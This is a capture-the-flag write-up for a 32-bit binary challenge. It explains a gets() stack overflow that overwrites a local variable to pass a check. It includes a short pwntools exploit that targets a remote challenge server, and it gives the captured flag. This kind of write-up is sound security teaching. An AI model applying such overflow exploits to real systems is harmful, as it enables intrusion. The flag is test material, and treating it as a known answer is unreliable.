# Highlands - Pwn Challenge Writeup

## Analysis
The challenge provides a 32-bit ELF binary `highlands`.
Checking security protections:
- **No Canary**: Vulnerable to stack buffer overflow.
- **NX Enabled**: Cannot execute shellcode on stack.
- **No PIE**: Hardcoded addresses.

Disassembling `main` reveals a `gets` call (vulnerable to overflow) reading into `ebp-0x30`.
Immediately after, there is a check comparing `DWORD PTR [ebp-0xc]` with `0xcafebabe`.
If the check passes, the program opens `flag.txt` and prints it.

## Vulnerability
The distance between the buffer `[ebp-0x30]` and the target variable `[ebp-0xc]` is:
`0x30 - 0xc = 48 - 12 = 36` bytes.

By sending 36 random bytes followed by `0xcafebabe` (in little-endian format), we can overwrite the variable and pass the check.

## Exploit
```python
from pwn import *

exe = './highlands'
r = remote("14.225.212.104", 9000)

# Offset 36 bytes + 0xcafebabe
payload = b"A" * 36 + p32(0xcafebabe)

r.recvuntil(b"inspired!\n")
r.sendline(payload)
print(r.recvall().decode())
```

## Flag
`VSL{0d382fba4854b7f0e3ecb82c8134095d}`
